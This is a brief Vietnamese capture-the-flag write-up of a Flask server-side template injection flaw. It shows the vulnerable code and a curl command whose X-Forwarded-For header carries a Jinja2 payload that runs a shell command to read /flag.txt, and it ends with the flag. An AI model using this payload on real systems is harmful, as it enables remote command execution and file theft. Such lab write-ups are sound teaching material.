# Write Up

Lỗ hổng

```python
message = f"This page is being accessed from the remote address: {client_ip}
return render_template_string(message)
```

Nó không filter đầu vào của client_ip, và chèn trực tiếp vào template string, dẫn đến bạn có thể inject vào X-Forwarded-For để thực thi Jinja2 template bất kỳ

```bash
curl -H "X-Forwarded-For: {{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}" http://localhost:1337/
```

Flag: CHH{S1mPl3_Jinja_SSST1_header_4183a06d4837229da6c054e0fc2a64dc}
